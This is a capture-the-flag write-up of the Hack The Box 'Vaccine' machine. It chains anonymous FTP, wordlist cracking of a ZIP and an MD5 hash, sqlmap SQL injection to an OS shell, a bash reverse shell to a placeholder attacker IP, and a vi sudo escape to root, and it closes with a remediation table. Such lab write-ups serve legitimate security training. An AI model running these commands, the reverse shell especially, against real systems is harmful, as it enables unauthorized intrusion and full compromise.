# Write-Up — Vaccine: FTP Backup Crack to SQL Injection to Root via GTFOBins (vi)

> **Type:** Network / Web Application / Linux Privilege Escalation Penetration Test (HTB Starting Point)
> **Target:** `10.129.95.118` (`Vaccine`)
> **Tools:** Nmap, FTP, John the Ripper (zip2john), Hashcat, sqlmap, ncat, SSH
> **Final Result:** Root access via a chained path: anonymous FTP → password-protected backup archive cracked → hashed web credentials cracked → SQL Injection to OS shell → plaintext DB password found on disk → GTFOBins abuse of a `vi` sudo rule

---

## 1. Introduction

The target is a Linux host exposing FTP, SSH, and a web application backed by PostgreSQL. The objective was to enumerate every open service, chain several small findings together, and escalate from an anonymous FTP connection all the way to root.

This box is a strong demonstration of a recurring theme in real assessments:

- **Enumeration matters even when nothing looks immediately exploitable.** A stray backup file on an anonymous FTP share turned out to be the entire way in.
- **Weak/reused passwords remain a critical risk**, even when they're hashed — offline cracking made short work of both a ZIP password and an MD5 web credential.
- **Privilege escalation is frequently a misconfigured `sudo` rule**, not a kernel exploit — GTFOBins is often the fastest path to check first.

---

## 2. Reconnaissance

### 2.1 Connectivity Check

```bash
ping 10.129.95.118
```

Successful replies confirmed the VPN tunnel was up and the target was reachable.

### 2.2 Port Scan — Nmap

```bash
nmap -sV -sC 10.129.95.118
```

Result:

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | [version as reported by scan] |
| 22/tcp | SSH | [version as reported by scan] |
| 80/tcp | HTTP | [version as reported by scan] |

Three ports were found open. With no SSH credentials available, FTP was the logical starting point — Nmap's script scan confirmed **anonymous login was allowed**.

---

## 3. Vulnerability Analysis & Initial Access

### 3.1 Anonymous FTP Enumeration

```bash
ftp 10.129.95.118
```

Logged in as `anonymous` with a blank password. Listing the directory revealed a **`backup.zip`** file.

```bash
get backup.zip
```

### 3.2 Cracking the Archive Password

```bash
unzip backup.zip
```

The archive was password-protected; a few common passwords were tried manually with no success, so the archive was converted to a crackable hash format:

```bash
zip2john backup.zip > hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
john --show hashes
```

Cracked password:

```
741852963
```

Extracting with this password revealed the web application's source files, including `index.php`.

### 3.3 Recovering and Cracking Web Credentials

Reading `index.php` revealed a hardcoded authentication check:

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
    $_SESSION['login'] = "true";
    header("Location: dashboard.php");
```

The hash was identified as MD5 and cracked with Hashcat:

```bash
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
```

Cracked password:

```
qwerty789
```

### 3.4 Web Application Login

Navigating to `http://10.129.95.118` presented a login form. Supplying `admin` / `qwerty789` succeeded, granting access to a dashboard with a product catalogue/search feature.

---

## 4. Foothold — SQL Injection to OS Shell

### 4.1 Identifying the Injectable Parameter

The catalogue search used a `search` GET parameter:

```
http://10.129.95.118/dashboard.php?search=<query>
```

### 4.2 Confirming SQL Injection with sqlmap

Since the endpoint required an authenticated session, the `PHPSESSID` cookie was captured (via browser dev tools / a cookie-editor extension) and supplied to sqlmap:

```bash
sqlmap -u 'http://10.129.95.118/dashboard.php?search=any+query' --cookie="PHPSESSID=<session_id>"
```

sqlmap confirmed:

```
GET parameter 'search' is vulnerable.
```

### 4.3 Escalating to an OS Shell

```bash
sqlmap -u 'http://10.129.95.118/dashboard.php?search=any+query' --cookie="PHPSESSID=<session_id>" --os-shell
```

This granted a shell, though unstable/non-interactive. Stability was improved with a bash reverse shell payload:

```bash
bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1"
```

Listener:

```bash
nc -nvlp 443
```

After executing the payload through the sqlmap OS-shell, the listener caught the callback, and the shell was upgraded to a full TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo
fg
export TERM=xterm
```

### 4.4 User Flag

```bash
postgres@vaccine:~$ ls
user.txt
```

> **Severity: Critical.** SQL Injection leading directly to OS command execution as the `postgres` service account.

---

## 5. Privilege Escalation

### 5.1 Checking sudo Privileges

```bash
sudo -l
```

Failed initially — the `postgres` account's own password was unknown, so `sudo -l` could not be used yet.

### 5.2 Locating a Plaintext Database Password

Since the application used both PHP and PostgreSQL, application source was checked for embedded credentials:

```bash
cd /var/www/html
ls -la
cat dashboard.php
```

Found:

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

Recovered password:

```
P@s5w0rd!
```

### 5.3 Stabilizing Access via SSH

Rather than relying on the SQLi-derived shell (prone to dying), a direct SSH session was established:

```bash
ssh postgres@10.129.95.118
# password: P@s5w0rd!
```

### 5.4 Re-checking sudo Privileges

```bash
sudo -l
```

```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

### 5.5 Abusing the vi Sudo Rule (GTFOBins)

A direct shell-escape attempt failed due to the restricted invocation:

```bash
sudo vi -c ':!/bin/sh' /dev/null
# Sorry, user postgres is not allowed to execute ... as root on vaccine.
```

The GTFOBins-documented alternative — invoking the allowed command exactly as permitted, then escaping from within the editor — succeeded:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside vi:

```
:set shell=/bin/sh
:shell
```

### 5.6 Root Shell Confirmation

```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

### 5.7 Root Flag

```bash
cd /root
bash
ls
```

```
root.txt
```

> **Severity: Critical.** A `sudo` rule intended to allow limited configuration editing granted full root shell access via vi's built-in `:shell` escape.

---

## 6. Full Attack Chain

```
[ Recon: Nmap ]
       │
       ▼
[ FTP (21), SSH (22), HTTP (80) — anonymous FTP allowed ]
       │
       ▼
[ backup.zip retrieved → cracked with zip2john + John (741852963) ]
       │
       ▼
[ index.php reveals MD5 admin hash → cracked with Hashcat (qwerty789) ]
       │
       ▼
[ Web login as admin → dashboard.php search parameter found ]
       │
       ▼
[ sqlmap confirms SQLi → --os-shell → reverse shell as postgres ]
       │
       ▼
[ user.txt read ]
       │
       ▼
[ dashboard.php source reveals plaintext PostgreSQL password ]
       │
       ▼
[ SSH as postgres → sudo -l reveals restricted vi rule ]
       │
       ▼
[ GTFOBins vi :shell escape → root shell ]
       │
       ▼
[ root.txt read ]
```

**Lesson:** Every individual step was a small, well-known technique — cracking a ZIP, cracking an MD5 hash, automating a SQLi, reading a config file, and looking up a GTFOBins entry. None required custom exploit development; all required patience and thorough enumeration at each stage.

---

## 7. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | Anonymous FTP access exposing a password-protected backup archive | **High** | Disable anonymous FTP; never store backups (even password-protected ones) on a share reachable without strong authentication. |
| 2 | Weak ZIP archive password, crackable via wordlist | **High** | Use strong, high-entropy passphrases for any encrypted archive, and prefer modern encryption (AES-256 ZIP or a dedicated encryption tool) over legacy ZipCrypto. |
| 3 | Web application credentials hardcoded with a weak, crackable MD5 hash | **Critical** | Never hardcode credentials in source. Use a strong adaptive hashing algorithm (bcrypt, Argon2) with per-user salts instead of unsalted MD5. |
| 4 | SQL Injection in the `search` parameter of `dashboard.php` | **Critical** | Use parameterized queries/prepared statements for all database access; validate and sanitize all user-supplied input. |
| 5 | Plaintext database password embedded in application source (`dashboard.php`) | **Critical** | Store credentials in environment variables or a secrets manager, never directly in source code accessible to anyone who can read the file. |
| 6 | Overly permissive `sudo` rule allowing `vi` on a config file as root | **Critical** | Avoid granting `sudo` rights to general-purpose editors; if editing a specific file is required, use a restricted wrapper script that cannot invoke a shell, or tools designed for safe privileged editing (e.g., `sudoedit`). |

---

## 8. Conclusion

This box is a compact illustration of principles that scale to nearly every real engagement:

1. **Enumeration, not exploitation skill, is usually the deciding factor.** A single overlooked backup file on an anonymous FTP share was the entire root cause of the eventual full compromise.
2. **Every credential you find is worth cracking — even hashed ones.** Neither the ZIP password nor the MD5 hash used any advanced technique to defeat; a standard wordlist handled both.
3. **`sudo -l` should always be checked, and GTFOBins should always be consulted.** Custom privilege escalation exploits are rare; misconfigured `sudo` rules for common binaries are common.

The fix, as with most findings of this class, is layered discipline: no credentials on open shares, strong hashing everywhere, parameterized queries, and least-privilege `sudo` configuration.
